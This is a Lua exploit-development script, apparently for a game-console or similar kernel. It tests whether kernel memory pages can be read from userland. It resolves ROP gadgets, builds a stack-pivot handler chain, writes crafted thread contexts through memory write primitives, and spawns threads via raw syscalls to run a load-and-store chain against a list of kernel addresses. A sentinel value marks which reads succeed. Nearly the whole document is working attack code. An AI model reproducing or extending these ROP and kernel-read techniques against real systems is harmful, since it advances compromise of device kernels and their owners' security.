-- CRASH_CLASS: HIGH
-- PROBE 1006a: can a kernel page be read from userland at all?
--
-- The oracle says a page is present; it cannot say whether it is user-readable. So
-- read it: a child executes a stack chain (pop rax; target; mov rax,[rax]; pop rdi;
-- out; mov [rdi],rax) and stores into a buffer the parent can see. If the load faults,
-- the handler dumps the context instead and the store never happens, so a sentinel in
-- the buffer separates "readable" from "faulted". The chain ends in a spin, which costs
-- one thread per candidate, so this run uses six.

local STUB  = 0xFFFFFFFFC0000000
local IMG1  = 0xFFFFFFFFD8000000
local IMG2  = 0xFFFFFFFFD9000000
local IMG3  = 0xFFFFFFFFDD000000
local KMISS = 0xFFFFFFFFE0000000
local UMISS = 0x0000700000000000

local TARGETS = { STUB, IMG1, IMG2, IMG3, KMISS, UMISS }

print("=== PROBE 1006a: KERNEL READ PROBE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return tostring(v) end return "?" end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return nil end

print(string.format("[0] pid=%u fd=%u", to_num(mk(20)()), rd(signal.fd_addr) or 0))

-- handler chain: dump 0x40 from ctx+0x100 then exit that thread
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local hc = ropchain({ stack_base = to_num(ph.pivot_addr) })
hc:push_store_rdx_into_memory(ctxt)
hc:push_syscall_raw(syscall.write, function()
    hc:push_set_rdx(0x40)
    hc:push_set_rax_from_memory(ctxt)
    hc:push_add_to_rax(0x100)
    hc:push_set_reg_from_rax("rsi")
    hc:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
hc:push_syscall_raw(mk(431), function() hc:push_set_rdi(0) end)

local function A(x) local ok,v=pcall(function() return as_addr(x) end) if ok and v and v>0 then return v end return 0 end
local pop_rax = A(gadgets["pop rax; ret"])
local ld_rax  = A(gadgets["mov rax, [rax]; ret"])
local pop_rdi = A(gadgets["pop rdi; ret"])
local st_rdi  = A(gadgets["mov [rdi], rax; ret"])
if pop_rax==0 or ld_rax==0 or pop_rdi==0 or st_rdi==0 then
  print("[!] a gadget did not resolve; aborting")
  return
end

local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local out = mmap(page)
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
local ctxa, outa = as_addr(ctx), out
print(string.format("[1] out=0x%X ctx=0x%X pop_rax=0x%X ld=0x%X st=0x%X", outa, ctxa, pop_rax, ld_rax, st_rdi))

for i, target in ipairs(TARGETS) do
    local stack = mmap(page)
    local ch = { pop_rax, target, ld_rax, pop_rdi, outa, st_rdi, ld_rax }
    for k=1,#ch do wq(stack+(k-1)*8, ch[k]) end
    wq(outa, 0xDEADBEEF)
    for o=0,0x4F8,8 do wq(ctxa+o,0) end
    wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000)
    wq(ctxa+Ctx.CS,0x43); wq(ctxa+Ctx.SS,0x3B)
    wq(ctxa+Ctx.RIP,pop_rax); wq(ctxa+Ctx.RSP,stack)
    wq(as_addr(tb),0)
    print(string.format("[T%d] 0x%X chain=0x%X", i, target, stack))
    local ok, rv = pcall(function() return mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
    if not ok then print(string.format("[T%d] spawn error", i)) end
    wq(as_addr(ts),0); wq(as_addr(ts)+8,200*1000000)
    pcall(function() mk(240)(uint64(as_addr(ts)),uint64(0)) end)
    print(string.format("[T%d] out=%s", i, rq(outa)))
end
print(string.format("[E] alive pid=%u", to_num(mk(20)())))
print("=== COMPLETE ===")
